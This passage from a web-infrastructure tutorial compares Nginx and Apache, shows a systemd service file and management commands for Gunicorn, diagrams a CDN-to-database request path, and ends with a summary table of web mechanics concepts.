| Best for | High-traffic, reverse proxy, static serving | Shared hosting, .htaccess flexibility, legacy apps |

**Nginx is preferred** for most modern high-traffic applications, microservices, and reverse proxy roles.

**Apache is preferred** for shared hosting environments (where `.htaccess` is essential for per-customer config), legacy applications, and scenarios where per-directory configuration is needed.

---

## 7.6 Systemd Service Management

In production, application servers are managed by systemd:

```ini
# /etc/systemd/system/gunicorn.service
[Unit]
Description=Gunicorn daemon for MyApp
After=network.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/var/www/myapp
Environment="DJANGO_SETTINGS_MODULE=myapp.settings.production"
Environment="DATABASE_URL=postgresql://localhost/myapp"
ExecStart=/var/www/myapp/venv/bin/gunicorn \
    myapp.wsgi:application \
    --workers 4 \
    --worker-class sync \
    --bind unix:/tmp/gunicorn.sock \
    --timeout 30 \
    --access-logfile /var/log/gunicorn/access.log \
    --error-logfile /var/log/gunicorn/error.log
ExecReload=/bin/kill -s HUP $MAINPID
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
```

```bash
# Enable and start
sudo systemctl enable gunicorn
sudo systemctl start gunicorn
sudo systemctl status gunicorn

# Zero-downtime reload (sends HUP signal, workers gracefully restart)
sudo systemctl reload gunicorn
```

---

# Putting It All Together: A Complete Architecture

To close this guide, let's look at how all these components work together in a production web application:

```
User Browser
    │
    │ 1. DNS resolution
    │ 2. TCP + TLS handshake to CDN edge
    │
    ▼
[Cloudflare CDN Edge PoP]
    │
    ├── Cache HIT → Return cached response
    │
    └── Cache MISS ↓
    │
    │ 3. TCP + TLS to Load Balancer
    ▼
[AWS Application Load Balancer]
    │ L7 routing, SSL termination
    │ Health checks
    │
    ├── /api/* → API Server Pool
    │
    └── /* → Web Server Pool
    │
    ▼
[Nginx (Reverse Proxy on each server)]
    │
    ├── /static/* → Serve from filesystem (browser cache headers set)
    │
    └── /* → Forward to Gunicorn (app server)
    │
    ▼
[Gunicorn + Django Application]
    │
    ├── Query PostgreSQL (database)
    ├── Query Redis (sessions, cache)
    └── Generate response
    │
    ▼
Response flows back:
    Gunicorn → Nginx → Load Balancer → CDN → Browser
    
Browser:
    HTML parsed → DOM built
    CSS fetched (from CDN cache) → CSSOM built
    Render Tree → Layout → Paint → Composite → Screen
```

---

# Summary

| Topic | Key Takeaway |
|-------|-------------|
| **Request-Render Pipeline** | DNS → TCP → TLS → HTTP → DOM → CSSOM → Render → Layout → Paint → Composite |
| **Cookies** | Small browser-stored data sent automatically with requests; HttpOnly, Secure, SameSite are critical |
| **Sessions** | Server-side state storage with a session ID cookie; Redis is the industry standard store |
| **localStorage** | Persistent, ~5MB, per-origin, JS-only, survives browser restart |
| **sessionStorage** | Per-tab, ~5MB, cleared on tab close, isolated between tabs |
| **Browser Cache** | HTTP headers (Cache-Control, ETag) control freshness and revalidation |
| **Proxy Cache** | Shared cache for multiple users; corporate networks, ISPs |
| **CDN** | Globally distributed edge caches; dramatically reduce latency and origin load |
| **Load Balancers** | Distribute traffic across servers; L4 (TCP) vs L7 (HTTP); algorithms like round-robin, least-conn |
| **Forward Proxy** | Represents clients to servers; privacy, content filtering, VPNs |
| **Reverse Proxy** | Represents servers to clients; load balancing, SSL termination, caching, routing |
| **Nginx** | Event-driven web/proxy server; excellent for high concurrency and static files |
| **Apache** | Process/thread-based server; great for .htaccess, shared hosting |
| **Application Servers** | Run application code; Gunicorn (Python), Puma (Ruby), Tomcat (Java), PM2/Node, PHP-FPM |

---

*This concludes Part XI — Web Mechanics. Understanding these components and how they interact gives you the foundation to build, deploy, debug, and optimize real-world web applications at any scale.*